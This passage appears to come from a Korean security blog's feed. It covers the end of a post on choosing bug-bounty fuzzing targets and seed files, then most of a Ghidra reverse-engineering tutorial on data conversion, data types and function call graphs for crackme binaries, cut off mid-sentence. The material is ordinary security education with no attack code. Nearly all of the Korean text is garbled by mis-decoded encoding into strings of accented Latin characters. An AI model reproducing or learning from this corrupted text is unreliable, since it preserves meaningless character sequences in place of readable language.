ê¸ˆì•¡ì´ ë‹¬ë¼ì§€ë‹ˆê¹Œìš”!!! ê·¸ëŸ¼ ëª…ì˜ˆì˜ ì „ë‹¹ ìˆœìœ„ê°€ ë³€ë™ì´ ë³„ë¡œ ì•ˆë˜ë‹ˆê¹Œìš”!!!!(ë­ ë”±íˆ ìƒê´€ì€ ì—†ì§€ë§Œ) ì•”íŠ¼ íƒ€ê¹ƒì„ ì„ ì •í•˜ê¸° ì „ì— ë²„ê·¸ í—ŒíŒ…ì„ í•˜ëŠ” ëª©ì ì„ ì •í•´ì•¼ í•©ë‹ˆë‹¤.</p><ol><li>ë‚œ ëˆì„ ë²Œê³  ì‹¶ë‹¤!!!! or ì œë¡œë°ì´ ë§›ì´ë¼ë„ ë³´ê³  ì‹¶ì–´ìš” ã… ã…  í•˜ë‚˜ë§Œ ì°¾ì•„ë³´ê³  ì‹¶ì–´ìš” ã… ã… ã… <ul><li>ê·¸ëŸ¼ ì‰½ê³  ìµìŠ¤ í•˜ê¸° ì‰¬ìš´ ê±° í•˜ì‹œë©´ ë©ë‹ˆë‹¤. ë¦¬ì–¼ë£¨ ê·¸ëƒ¥ ë‚ ë¡œ ë¨¹ìœ¼ë©´ì„œ ëˆ ë§ì´ ë°›ì„ ìˆ˜ ìˆëŠ” í”„ë¡œê·¸ë¨ ì¢€ ìˆì–´ìš” ã…‹ã…‹ í•˜ì§€ë§Œ ì—¬ê¸°ì—ì„œëŠ” ì‹¤ì œ ë²¤ë” ì´ë¦„ì€ ê¹Œì§€ ì•ŠëŠ” ê±¸ë¡œâ€¦ ì˜ ì°¾ì•„ë³´ì‹œë©´ ì€ê·¼íˆ ë§ìŠµë‹ˆë‹¤. ëª¨ë“  ëª¨ë“ˆì— Rebase, ASLR ì•ˆ ê±¸ë ¤ ìˆëŠ” í”„ë¡œê·¸ë¨ë„ ë´¤ì–´ìš” ã…‹ã…‹ã…‹ã…‹ã…‹ã…‹ã…‹ã…‹</li></ul></li><li>ë‚œ ì§€ì‹ê³¼ ëª…ì˜ˆë¥¼ ì–»ê² ë‹¤!!!<ul><li>CVEê°€ ë‚˜ì˜¬ë§Œí•œ í”„ë¡œê·¸ë¨ì„ ëŒ€ìƒìœ¼ë¡œ í•˜ì‹œë©´ ë©ë‹ˆë‹¤. ë¸Œë¼ìš°ì €ë¼ë˜ê°€ ì»¤ë„ì´ë¼ë˜ê°€â€¦. (ì•„ ê·¼ë° ì™œ ìš”ìƒˆ ì£¼ë³€ì— ìœˆë„ìš° ì»¤ë„ í•˜ëŠ” ì‚¬ëŒì´ ë§ì•„ì§„ ëŠë‚Œì´ì§€ ë‚´ê°€ ì‹œì‘í•˜ë ¤ê³  í•˜ë‹ˆê¹Œ ì£¼ë³€ì—ì„œ ë‹¤í•˜ë„¤ ë‹¤ë“¤ ìœˆë„ìš° ì»¤ë„ í•˜ì§€ ë§ˆì…ˆ)</li></ul></li><li>ê·¸ëŸ¼ ë‚˜ë¨¸ì§„ ë­ëƒ!!!!<ul><li>ê·¸ëƒ¥ í•˜ì‹œë©´ ë©ë‹ˆë‹¤â€¦â€¦. ì‹¬ì‹¬í•´ì„œ í•˜ëŠ” ê±°ì˜ˆìš”â€¦â€¦.;;;</li></ul></li></ol><p>ì¥ë‚œì´ê³  ã…‹ã…‹ã…‹ ìŒ ê·¸ë˜ì„œ íƒ€ê¹ƒì„ ë‚´ê°€ ì•„ëŠ” í”„ë¡œê·¸ë¨ìœ¼ë¡œë§Œ í•  ê²ƒì´ëƒ?? ã„´ã„´ ê·¸ê±´ ì•„ë‹ˆì£ </p><p><a href="http://software.naver.com/main.nhn">http://software.naver.com/main.nhn</a></p><p>ë„¤ì´ë²„ì—ì„œ ì´ë ‡ê²Œ ì†Œí”„íŠ¸ì›¨ì–´ ìë£Œì‹¤ì„ ìš´ì˜í•˜ê³  ìˆìŠµë‹ˆë‹¤. ë³´ê¸‰ë„ë‚˜ ì´ëŸ° ê±´ ì •í™•í•œ ìˆ˜ì¹˜ë¡œëŠ” ì•ˆ ë‚˜ì™€ ìˆì§€ë§Œ ì¶”ì¸¡ì€ ê°€ëŠ¥í•˜ì£  ã…‹ã…‹ ì¸ê¸° ë§ì€ ê²Œ ì‚¬ëŒë“¤ì´ ë§ì´ ì“°ëŠ” ê±°ê² ì£ ?? ë„¤ì´ë²„ë¿ë§Œ ì•„ë‹ˆë¼ ë‹¤ìŒì´ë‚˜ ë‹¤ë¥¸ ì‚¬ì´íŠ¸ì—ì„œë„ ë¹„ìŠ·í•œ ê²ƒë“¤ì´ ìˆìœ¼ë‹ˆ ì´ëŸ° ì‚¬ì´íŠ¸ì—ì„œ ì°¾ìœ¼ì‹œë©´ ë  ê±° ê°™ìŠµë‹ˆë‹¤.</p><h1 id="ì‹œë“œ-íŒŒì¼"><a href="#ì‹œë“œ-íŒŒì¼" class="headerlink" title="ì‹œë“œ íŒŒì¼"></a>ì‹œë“œ íŒŒì¼</h1><p>í¼ì €ì—ì„œ ì–‘ì§ˆì˜ ê²°ê³¼ë¥¼ ë‚˜ì˜¤ê²Œ í•˜ê¸° ìœ„í•´ì„œëŠ” ì–‘ì§ˆì˜ ì‹œë“œ íŒŒì¼ì„ ë„£ëŠ” ê²ƒë„ ë§¤ìš° ì¤‘ìš”í•©ë‹ˆë‹¤ ã…‹ã…‹ã…‹</p><p>ë¨¼ì € íƒ€ê¹ƒ í”„ë¡œê·¸ë¨ì˜ ì–´ë–¤ ë¶€ë¶„ì„ í¼ì§• í•  ê²ƒì¸ì§€ ì •í•´ì•¼ í•©ë‹ˆë‹¤. ë¯¸ë””ì–´ í”Œë ˆì´ì–´ì˜ ê²½ìš°, ìŒì•…ì´ë‚˜ ë™ì˜ìƒì˜ í¬ë§·ë§Œ ê²°ì •í•˜ë©´ ë˜ê¸´ í•˜ì§€ë§Œ(ê·¸ë ‡ë‹¤ê³ ëŠ” í•˜ì§€ë§Œ ë²„ì „ì´ë‚˜ ì••ì¶• ë°©ì‹, ìš´ì˜ë°©ì‹ ë“±ë“±ì˜ ì°¨ì´ë¡œ ê¸°ëŠ¥ì˜ ì°¨ì´ê°€ ì¢€ ìˆìŠµë‹ˆë‹¤. ê·¸ë ‡ê¸° ë•Œë¬¸ì— ê°™ì€ í¬ë§·ì´ë”ë¼ë„ ìƒ˜í”Œì´ ë§ì„ìˆ˜ë¡ ì¢‹ì£ ), ì›Œë“œë‚˜ í•œê¸€ ê°™ì´ ê¸°ëŠ¥ì´ ë§ì€ í”„ë¡œê·¸ë¨ë“¤ì€ êµ¬ì²´ì ìœ¼ë¡œ ì–´ë–¤ ê¸°ëŠ¥ì— ëŒ€í•´ì„œ í¼ì§•ì„ ì§„í–‰í• ì§€ë¥¼ ê²°ì •í•´ì•¼ í•©ë‹ˆë‹¤. ì´ë ‡ê²Œ ì•ˆ í•˜ê³  ê·¸ëƒ¥ ë§‰ ë§Œë“¤ë©´ ë¦¬ë²„ì‹± í•  ë•Œ í•„ìš” ì—†ëŠ” ë¶€ë¶„ ë¦¬ë²„ì‹± í•˜ëŠë¼ ì‹œê°„ ë‚­ë¹„í•˜ê¸° ì¼ì‘¤ì…ë‹ˆë‹¤ ã… ã…  ë”°ë¼ì„œ ë¨¼ì € í”„ë¡œê·¸ë¨ì„ ì¨ë³´ë©´ì„œ ì–´ë–¤ ê¸°ëŠ¥ì´ ìˆëŠ”ì§€ íŒŒì•…í•˜ê³  ê´œì°®ê² ë‹¤ ì‹¶ì€ ê¸°ëŠ¥ë“¤ì„ ì •ë¦¬í•´ì„œ í•˜ë‚˜í•˜ë‚˜ì— ëŒ€í•œ ì‹œë“œ íŒŒì¼ì„ ë”°ë¡œ ì œì‘í•˜ëŠ” ê²Œ ì œì¼ ì¢‹ìŠµë‹ˆë‹¤.</p><p>ì œì¼ ì¢‹ì€ ë°©ë²•ì€ ì§ì ‘ ì‹œë“œ íŒŒì¼ì„ ì œì‘í•˜ëŠ” ê²ƒì…ë‹ˆë‹¤. ì§ì ‘ ì œì‘í•˜ë©´ ì•ˆì— ë°ì´í„°ë¥¼ ì›í•˜ëŠ” ë°ë¡œ ì¡°ì‘í•  ìˆ˜ ìˆê³  íƒ€ê¹ƒì´ ëª…í™•í•˜ê¸° ë•Œë¬¸ì— ë¦¬ë²„ì‹± í•  ë•Œ í¸ë¦¬í•¨ì´ ìˆìŠµë‹ˆë‹¤. ì§ì ‘ ì‹œë“œ íŒŒì¼ì„ ë§Œë“œëŠ” ê±°ëŠ” ë’¤ì—ì„œ ë˜ ì–˜ê¸°í•˜ë„ë¡ í•˜ê² ìŠµë‹ˆë‹¤.</p><p>ì§ì ‘ ë§Œë“¤ê¸° ì• ë§¤í•˜ê±°ë‚˜ ê·€ì°®ì„ ê²½ìš°ì—ëŠ” êµ¬ê¸€ ê²€ìƒ‰ìœ¼ë¡œ ë‹¤ìš´ë¡œë“œí•˜ë©´ ë©ë‹ˆë‹¤. Filetypeìœ¼ë¡œ ì›í•˜ëŠ” í¬ë§· ì°¾ì•„ì„œ ë‹¤ì–‘í•œ ì‹œë“œ íŒŒì¼ì„ ë‹¤ìš´ë¡œë“œí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><hr><p>Part 2ì—ì„œëŠ” ì‹¤ì œë¡œ ì œë³´í–ˆë˜ ë¯¸ë””ì–´ í”Œë ˆì´ì–´ KMPlayerì˜ ì·¨ì•½ì ì´ ë°œìƒí•˜ëŠ” íŒŒì¼ í¬ë§·ì— ëŒ€í•´ ë¶„ì„í•˜ëŠ” ê¸€ë¡œ ëŒì•„ì˜¤ê² ìŠµë‹ˆë‹¤!</p>]]></content>
    
    
    <categories>
      
      <category>Research</category>
      
    </categories>
    
    
    <tags>
      
      <tag>windows</tag>
      
      <tag>L0ch</tag>
      
      <tag>research</tag>
      
      <tag>bug hunting</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[Research] Re:versingìœ¼ë¡œ ì‹œì‘í•˜ëŠ” ghidra ìƒí™œ Part 2 - Data, Functions, Scripts</title>
    <link href="/2021/03/07/idioth/ghidra_part2/"/>
    <url>/2021/03/07/idioth/ghidra_part2/</url>
    
    <content type="html"><![CDATA[<p><strong>ë‹¤ë¥¸ íŒŒíŠ¸ ë³´ëŸ¬ê°€ê¸°</strong></p><p><a href="https://hackyboiz.github.io/2021/02/07/idioth/ghidra_part1/">Re:versingìœ¼ë¡œ ì‹œì‘í•˜ëŠ” ghidra ìƒí™œ Part 1 - Overview</a></p><p>Re:versingìœ¼ë¡œ ì‹œì‘í•˜ëŠ” ghidra ìƒí™œ Part 2 - Data, Functions, Scripts (Here!)</p><p><a href="https://hackyboiz.github.io/2021/04/04/idioth/ghidra_part3">Re:versingìœ¼ë¡œ ì‹œì‘í•˜ëŠ” ghidra ìƒí™œ Part 3 - tips for IDA User</a></p><p><a href="https://hackyboiz.github.io/2021/05/19/idioth/ghidra_part4/">Re:versingìœ¼ë¡œ ì‹œì‘í•˜ëŠ” ghidra ìƒí™œ Part 4 - Malware Analysis (1)</a></p><hr><p><img src="/2021/03/07/idioth/ghidra_part2/Untitled%201.png"></p><p>íŒŒíŠ¸ 2ë¡œ ëŒì•„ì™”ìŠµë‹ˆë‹¤. ìš”ì¦˜ ë‚ ì”¨ê°€ ë§ì´ ë”°ëœ»í•´ì¡Œë„¤ìš”. ìµœê·¼ ì œê°€ í•˜ë˜ ê²Œì„<del>(ìœ ì‚¬ ë„ë°•)</del>ì—ì„œ ì´ìŠˆê°€ í„°ì ¸ì„œ ê³µì¤‘íŒŒì—ë„ ì¶œí˜„í•˜ê³  ìˆìŠµë‹ˆë‹¤. ë‹‰ë„¤ì„ë‹µê²Œ ì£¼ìœ„ì—ì„œ í•˜ëŠ” ë§ì„ ë¬´ì‹œí•œ ì±„ ì¦ê¸°ê³  ìˆì—ˆìŠµë‹ˆë‹¤ë§Œâ€¦ ë­ ì•„ë¬´íŠ¼ ì˜¤ëœ ì‹œê°„ ì¦ê²¼ë˜ ì…ì¥ì´ë¼ ë§ˆìŒì´ ì•„í”„ë„¤ìš”. <del>í˜¹ì‹œ ì €ì™€ ê°™ì€ ê²Œì„ì„ í•˜ì‹œë˜ ë¶„ì´ë¼ë©´ ìƒì–´ë²„ë¦° ì•„í¬ë¥¼ ì°¾ìœ¼ëŸ¬</del></p><p>ë”´ ì†Œë¦¬ëŠ” ê·¸ë§Œí•˜ê³  <a href="https://hackyboiz.github.io/2021/02/07/idioth/ghidra_part1/">ì €ë²ˆ íŒŒíŠ¸</a>ì—ì„œëŠ” ghidraì— ëŒ€í•œ ì „ë°˜ì ì¸ ê²ƒì— ëŒ€í•´ì„œ ì•Œì•„ë³´ì•˜ìŠµë‹ˆë‹¤. ì´ë²ˆ íŒŒíŠ¸ëŠ” ë°ì´í„° ë³€í™˜, ë°ì´í„° íƒ€ì… ì ìš©, í•¨ìˆ˜ í˜¸ì¶œ íŠ¸ë¦¬ ë° ê·¸ë˜í”„, ìŠ¤í¬ë¦½íŠ¸ ë§¤ë‹ˆì €ì™€ ë©”ëª¨ë¦¬ ë§µì— ëŒ€í•´ì„œ ë‹¤ë£° ì˜ˆì •ì…ë‹ˆë‹¤.</p><p>ì´ë²ˆ ì‹œê°„ì— ì˜ˆì œë¡œ ë‹¤ë£° ë°”ì´ë„ˆë¦¬ëŠ” ì´ ë‘ ê°€ì§€ì…ë‹ˆë‹¤. <a href="https://hackyboiz.github.io/2021/02/07/idioth/ghidra_part1/">Part 1</a>ì—ì„œ ë‹¤ë£¨ì—ˆë˜ ë°”ì´ë„ˆë¦¬ì™€ <a href="http://reversing.kr/">reversing.kr</a>ì— ì—…ë¡œë“œëœ Easy Keygen ë¬¸ì œì…ë‹ˆë‹¤.</p><h1 id="ë°ì´í„°-ë³€í™˜"><a href="#ë°ì´í„°-ë³€í™˜" class="headerlink" title="ë°ì´í„° ë³€í™˜"></a>ë°ì´í„° ë³€í™˜</h1><p>ë¶„ì„ì„ ìˆ˜í–‰í•  ë•Œ ê°ì ì„ í˜¸í•˜ëŠ” ë°ì´í„° íƒ€ì…ì´ ìˆì„ ìˆ˜ë„ ìˆê³ , ì•„ë‹ˆë©´ ë¶€ì •í™•í•˜ê²Œ ë°ì´í„° íƒ€ì…ì´ í‘œì‹œë˜ëŠ” ê²½ìš°ê°€ ìˆìŠµë‹ˆë‹¤. 10ì§„ìˆ˜ë¡œ ë³´ê³  ì‹¶ì€ë° 16ì§„ìˆ˜ë¡œ í‘œì‹œë˜ì–´ ìˆê±°ë‚˜ ê·¸ ë°˜ëŒ€ì¸ ê²½ìš°ê°€ ìˆì£ .</p><p>ì ì¼ë‹¨ ghidraë¥¼ í†µí•´ crackme.exe ë°”ì´ë„ˆë¦¬ íŒŒì¼ì„ ì—° í›„ main í•¨ìˆ˜ë¡œ ë“¤ì–´ê°€ ë´…ì‹œë‹¤. ì¢Œì¸¡ Symbol Treeì—ì„œ Functions í´ë”ë¥¼ í™•ì¥í•˜ê³  <code>_main</code> í•¨ìˆ˜ë¥¼ ì°¾ì•„ì„œ í´ë¦­í•´ì£¼ì‹œë©´ ì¤‘ì•™ í™”ë©´ê³¼ ë””ìŠ¤ ì–´ì…ˆë¸” ì°½ì—ì„œ main í•¨ìˆ˜ë¥¼ ì¶œë ¥í•´ì¤ë‹ˆë‹¤.</p><p><img src="/2021/03/07/idioth/ghidra_part2/Untitled%202.png"></p><p><img src="/2021/03/07/idioth/ghidra_part2/Untitled%203.png"></p><p>ì €ë²ˆ íŒŒíŠ¸ì—ì„œ ì…ë ¥ ê°’ì´ <code>0x1232b14</code>ì—¬ì•¼ í•˜ëŠ” ì ì€ ì•Œì•˜ìŠµë‹ˆë‹¤. ê·¼ë° ê·¸ëƒ¥ ëŒ€ì¶© ì“± í›‘ì–´ë³´ê³  <code>0x1232b14</code>ì—ì„œ 0xë¥¼ ëº€ <code>1232b14</code>ë¥¼ ì ëŠ”ë‹¤ë©´?</p><p><img src="/2021/03/07/idioth/ghidra_part2/Untitled%204.png"></p><p>Fail ë¬¸êµ¬ë¥¼ ë´ë²„ë¦½ë‹ˆë‹¤â€¦ ê³„ì‚°ê¸°ë¥¼ ì¼œê³  ì…ë ¥í•´ì„œ 10ì§„ìˆ˜ë¡œ ë³€í™˜í•˜ê¸° ê·€ì°®ê³ , pythonì„ ì¼œì„œ <code>0x1232b14</code>ë¥¼ 10ì§„ìˆ˜ë¡œ ë³€í™˜í•˜ê¸°ë„ ê·€ì°®ì€ë° ghidraì—ì„œ ë°”ë¡œ ë³€í™˜í•  ìˆ˜ ìˆëŠ” ë°©ë²•ì€ ì—†ì„ê¹Œ???</p><p><img src="/2021/03/07/idioth/ghidra_part2/Untitled%205.png"></p><p>ë³€í™˜í•  ìˆ˜ ìˆëŠ” ë°©ë²•ì´ ì—†ë‹¤ë©´ IDAë¥¼ ì‚¬ìš©í•˜ì§€ ì™œ ghidraë¥¼ ì‚¬ìš©í•˜ê² ìŠµë‹ˆê¹Œ? ë‹¹ì—°íˆ ì¡´ì¬í•©ë‹ˆë‹¤!!!</p><p><img src="/2021/03/07/idioth/ghidra_part2/Untitled%206.png"></p><p>ì»¤ì„œë¥¼ ìì‹ ì´ ë³€í™˜í•˜ê¸¸ ì›í•˜ëŠ” ë°ì´í„°ì— í´ë¦­ì„ í•©ë‹ˆë‹¤. ê·¸ëŸ¬ë©´ Listing ì°½ì€ ì»¤ì„œê°€ ìœ„ì¹˜í•œ ê³³ì— í•´ë‹¹í•˜ëŠ” ì–´ì…ˆë¸”ë¦¬ë¡œ ìë™ìœ¼ë¡œ ì´ë™í•˜ê²Œ ë©ë‹ˆë‹¤.</p><p><img src="/2021/03/07/idioth/ghidra_part2/Untitled%207.png"></p><p><img src="/2021/03/07/idioth/ghidra_part2/Untitled%208.png"></p><p>ê·¸ í›„ ì›í•˜ëŠ” ë°ì´í„° ê°’ì„ ìš°í´ë¦­ - Convert - ì›í•˜ëŠ” íƒ€ì…ìœ¼ë¡œ í´ë¦­í•˜ë©´ ë°ì´í„° íƒ€ì…ì´ ë³€ê²½ë©ë‹ˆë‹¤. ê°’ì´ ì •ìƒì ìœ¼ë¡œ ë°”ë€Œì—ˆëŠ”ì§€ í•œ ë²ˆ í™•ì¸ì„ í•´ë´…ì‹œë‹¤!</p><p><img src="/2021/03/07/idioth/ghidra_part2/Untitled%209.png"></p><p>ê°’ì´ ì •ìƒì ìœ¼ë¡œ ë³€í™˜ëœ ê²ƒì„ ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤. :)</p><h1 id="ë°ì´í„°-íƒ€ì…-ì ìš©"><a href="#ë°ì´í„°-íƒ€ì…-ì ìš©" class="headerlink" title="ë°ì´í„° íƒ€ì… ì ìš©"></a>ë°ì´í„° íƒ€ì… ì ìš©</h1><p>ghidraì—ì„œ ë°”ì´íŠ¸ ë°°ì—´ì€ ì¡°ê¸ˆ ë…íŠ¹í•˜ê²Œ í‘œì‹œë©ë‹ˆë‹¤. ëŒ€ë¶€ë¶„ crackme ë¬¸ì œë¥¼ í’€ê¸° ìœ„í•´ì„œ, í˜¹ì€ ë¶„ì„í•˜ê¸° ìœ„í•´ì„œëŠ” ì´ ë°”ì´íŠ¸ ë°°ì—´ì´ ë¬¸ìì—´ì¸ì§€ ì•„ë‹Œì§€ë¥¼ íŒë³„í•´ì•¼ í•©ë‹ˆë‹¤. ë¬¼ë¡  ghidraì—ì„œëŠ” ë°”ì´íŠ¸ ë°°ì—´ì„ ë¬¸ìì—´ë¡œ ë³€í™˜í•˜ëŠ” ê²ƒ ê°™ì€ ë°ì´í„° íƒ€ì… ì ìš©ì´ ì¡´ì¬í•©ë‹ˆë‹¤. :)</p><p>ì´ë²ˆ ë¶€ë¶„ì— ëŒ€í•´ì„œ ì‚´í´ë³´ê¸° ì „ì— Easy Keygen ë°”ì´ë„ˆë¦¬ë¥¼ ghidraë¡œ ì—´ì–´ë´…ì‹œë‹¤!</p><p><img src="/2021/03/07/idioth/ghidra_part2/Untitled%2010.png"></p><p><img src="/2021/03/07/idioth/ghidra_part2/Untitled%2011.png"></p><p>main í•¨ìˆ˜ë¡œ ê°€ê¸° ìœ„í•´ì„œ entry pointì—ì„œ <code>FUN_00401000</code>ì„ í´ë¦­í•˜ì—¬ ì´ë™í•˜ì—¬ ì¤ë‹ˆë‹¤.</p><p><img src="/2021/03/07/idioth/ghidra_part2/Untitled%2012.png"></p><p>main í•¨ìˆ˜ë¥¼ ì‚´í´ë³´ë˜ ì¤‘ <code>&amp;DAT_0040805c</code>ë¼ëŠ” ë…€ì„ì„ ë§Œë‚¬ìŠµë‹ˆë‹¤. ì´ ë…€ì„ì€ ë¬´ìŠ¨ ê°’ì¼ê¹Œâ€¦ í•œ ë²ˆ í™•ì¸í•´ë´…ì‹œë‹¤.</p><p><img src="/2021/03/07/idioth/ghidra_part2/Untitled%2013.png"></p><p><code>%s</code>ì˜€ë„¤ìš”. ê·¼ë° ë°ì´í„° íƒ€ì…ì´ ì •ì˜ë˜ì–´ ìˆì§€ ì•ŠìŠµë‹ˆë‹¤. ë”” ì»´íŒŒì¼ ì°½ë§Œ ë³¸ë‹¤ë©´ í•œëˆˆì— ì–´ë–¤ ê°’ì¸ì§€ ë“¤ì–´ì˜¤ì§€ê°€ ì•ŠìŠµë‹ˆë‹¤. ì´ ë…€ì„ì„ í•œ ë²ˆ ë³€í™˜ì‹œì¼œ ë³¼ê¹Œìš”?</p><p><img src="/2021/03/07/idioth/ghidra_part2/Untitled%2014.png"></p><p><code>DAT_0040805c</code> ìš°í´ë¦­ â†’ Data â†’ stringì„ ëˆ„ë¥´ë©´?</p><p><img src="/2021/03/07/idioth/ghidra_part2/Untitled%2015.png"></p><p>ìŒâ€¦ ë­”ê°€ í•œëˆˆì— í™• ë“¤ì–´ì˜¤ì§„ ì•Šì§€ë§Œ ì–´ë–¤ ê°’ì¸ì§€ëŠ” ëŒ€ì¶© ì•Œ ìˆ˜ ìˆê²Œ ë³€í–ˆìŠµë‹ˆë‹¤.</p><h1 id="í•¨ìˆ˜-í˜¸ì¶œ-íŠ¸ë¦¬ì™€-í˜¸ì¶œ-ê·¸ë˜í”„"><a href="#í•¨ìˆ˜-í˜¸ì¶œ-íŠ¸ë¦¬ì™€-í˜¸ì¶œ-ê·¸ë˜í”„" class="headerlink" title="í•¨ìˆ˜ í˜¸ì¶œ íŠ¸ë¦¬ì™€ í˜¸ì¶œ ê·¸ë˜í”„"></a>í•¨ìˆ˜ í˜¸ì¶œ íŠ¸ë¦¬ì™€ í˜¸ì¶œ ê·¸ë˜í”„</h1><p>ë¶„ì„ì„ í•˜ë‹¤ ë³´ë©´ ì´ í•¨ìˆ˜ê°€ ì–´ë””ì—ì„œ í˜¸ì¶œë˜ëŠ”ì§€, ì´ í•¨ìˆ˜ê°€ ì–´ë–¤ í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•˜ëŠ”ì§€ í™•ì¸í•´ì•¼ í•  ë•Œê°€ ìˆìŠµë‹ˆë‹¤. í•¨ìˆ˜ í˜¸ì¶œ íŠ¸ë¦¬ë¥¼ í†µí•´ ì´ ì‘ì—…ì„ ê°„ë‹¨í•˜ê²Œ ìˆ˜í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. Easy Keygen ë°”ì´ë„ˆë¦¬ì—ì„œ ë©”ì¸ í•¨ìˆ˜ê°€ ì–´ë–¤ í•¨ìˆ˜ì— ì˜í•´ì„œ í˜¸ì¶œì´ ë˜ëŠ”ì§€, ë©”ì¸ í•¨ìˆ˜ëŠ” ì–´ë–¤ í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•˜ëŠ”ì§€ í•¨ìˆ˜ í˜¸ì¶œ íŠ¸ë¦¬ë¥¼ í†µí•´ì„œ í™•ì¸ì„ í•´ë³¼ê¹Œìš”?</p><p><img src="/2021/03/07/idioth/ghidra_part2/Untitled%2016.png"></p><p><img src="/2021/03/07/idioth/ghidra_part2/Untitled%2017.png"></p><p>main í•¨ìˆ˜ì— ìœ„ì¹˜í•œ ì±„ë¡œ Window â†’ Function Call Tressë¥¼ í´ë¦­í•˜ë©´ ê¸°ë³¸ì ìœ¼ë¡œ í™”ë©´ í•˜ë‹¨ì— í•¨ìˆ˜ í˜¸ì¶œ íŠ¸ë¦¬ê°€ ë‚˜íƒ€ë‚˜ê²Œ ë©ë‹ˆë‹¤.(ì €ëŠ” ì´ë¯¸ì§€ê°€ ì¢Œìš°ë¡œ ê¸¸ê²Œ ëŠ˜ì–´ì ¸ì„œ í™”ë©´ ë°”ê¹¥ìœ¼ë¡œ ëºìŠµë‹ˆë‹¤â€¦^^;;)</p><p>í•¨ìˆ˜ í˜¸ì¶œ íŠ¸ë¦¬ë¥¼ ë³´ë©´ <code>FUN_00401000</code>ì€ <code>entry</code>ì— ì˜í•´ì„œ í˜¸ì¶œë˜ì—ˆê³ , <code>FUN_00401150</code>, <code>FUN_004011a2</code>, <code>FUN_004011b9</code>ë¥¼ í˜¸ì¶œí•˜ëŠ” ê²ƒì„ ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ëŸ° ì‹ìœ¼ë¡œ í•œëˆˆì— í™•ì¸í•  ìˆ˜ ìˆê² ì§€ë§Œ ë­”ê°€ ê·¸ë¦¼ìœ¼ë¡œ ë˜ì–´ìˆìœ¼ë©´ ì¢€ ë” ì•Œì•„ë³´ê¸° í¸í•˜ê² ì£ ? ê·¸ë ‡ë‹¤ë©´ Window â†’ Function Call Graphë¥¼ í´ë¦­í•´ì¤ë‹ˆë‹¤!</p><p><img src="/2021/03/07/idioth/ghidra_part2/Untitled%2018.png"></p><p>ì¢€ ë” ì•Œì•„ë³´ê¸° ì‰½ê²Œ ì–´ë–¤ í•¨ìˆ˜ì— ì˜í•´ì„œ í˜¸ì¶œë˜ê³  ì–´ë–¤ í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•˜ëŠ”ì§€ í•œëˆˆì— í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ë¬¼ë¡  ì´ëŸ° ì°½ë“¤ì€ ëª¨ë‘ ì»¤ìŠ¤í„°ë§ˆì´ì§• í•´ì„œ ì›í•˜ëŠ” ìœ„ì¹˜ì— ë‘˜ ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><p><img src="/2021/03/07/idioth/ghidra_part2/Untitled%2019.png"></p><p>ì´ëŸ° ì‹ìœ¼ë¡œë„ êµ¬ì„±í•  ìˆ˜ ìˆì£ . í•¨ìˆ˜ë¥¼ ì´ë™í•  ë•Œë§ˆë‹¤ ì–´ë–¤ í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•˜ëŠ”ì§€ í™•ì¸í•  ìˆ˜ ìˆëŠ” ê²ë‹ˆë‹¤.</p><p><img src="/2021/03/07/idioth/ghidra_part2/Untitled%2020.png"></p><h1 id="ìŠ¤í¬ë¦½íŠ¸-ë§¤ë‹ˆì €"><a href="#ìŠ¤í¬ë¦½íŠ¸-ë§¤ë‹ˆì €" class="headerlink" title="ìŠ¤í¬ë¦½íŠ¸ ë§¤ë‹ˆì €"></a>ìŠ¤í¬ë¦½íŠ¸ ë§¤ë‹ˆì €</h1><p>ì ì  ghidra ìƒí™œì´ í¸ë¦¬í•´ì§€ê³  ìˆìŠµë‹ˆë‹¤. ghidraë§Œ ìˆìœ¼ë©´ ì–´ì…ˆë„ ë³´ê³  ë””ì»´íŒŒì¼ë„ ë³´ê³  í•¨ìˆ˜ ê·¸ë˜í”„ë„ ë³´ê³  ë°ì´í„° íƒ€ì…ë„ ë‚´ê°€ ì›í•˜ëŠ” ëŒ€ë¡œ ì´ê²ƒì €ê²ƒ ìˆ˜ì •í•˜ë©´ì„œ ëª¨ë“  ê±¸ ë‹¤ í•  ìˆ˜ ìˆì„ ë“¯í•œ ëŠë‚Œì…ë‹ˆë‹¤.</p><p>ê·¼ë° ì•„ì§ ë­”ê°€ í—ˆì „í•©ë‹ˆë‹¤â€¦ ë¬¸ì œë¥¼ í’€ë‹¤ê°€ ì•”í˜¸ë¬¸ì´ ë‚˜ì™€ì„œ ìŠ¤í¬ë¦½íŠ¸ë¥¼ ì§œì•¼í•  ê²ƒ ê°™ì€ë°â€¦ ë‚œ ghidraë§Œ ìˆìœ¼ë©´ ë­ë“ ì§€ ë‹¤ í•  ìˆ˜ ìˆì„ ê²ƒì´ë¼ ìƒê°í–ˆëŠ”ë° vscodeë¥¼ ì¼œì„œ ìŠ¤í¬ë¦½íŠ¸ë¥¼ ì‘ì„±í•˜ê³  cmdë¥¼ ì¼œì„œ pythonì„ ì‹¤í–‰í•˜ì—¬ ìŠ¤í¬ë¦½íŠ¸ë¥¼ ì‹¤í–‰í•©ë‹ˆë‹¤. ê¸°ë¶„ì´ ë‚˜ì©ë‹ˆë‹¤. ghidraë¥¼ í†µí•´ì„œ ë­ë“  í•´ë‚´ê³  ì‹¶ìŠµë‹ˆë‹¤.</p><p><img src="/2021/03/07/idioth/ghidra_part2/Untitled%2021.png"></p><p>ìš•ì‹¬ì„ ë¶€ë¦¬ê³  ì‹¶ìŠµë‹ˆë‹¤. íˆ´ í•˜ë‚˜ë¡œ ë‹¤ í•´ë²„ë¦¬ê³  ì‹¶ìŠµë‹ˆë‹¤. í˜¼ìì„œ ë‹¤ ë•Œë ¤ ë¶€ìˆ˜ê³  ë‹¤ë‹ˆëŠ” ì €ê¸° ì € ìŠ¬ë¼ì„ì²˜ëŸ¼ìš”. ê·¸ë ‡ë‹¤ë©´ ìŠ¤í¬ë¦½íŠ¸ ë§¤ë‹ˆì €ê°€ ì—¬ëŸ¬ë¶„ì„ ë„ì™€ì¤„ ê²ë‹ˆë‹¤! ghidraì—ì„œëŠ” IDA 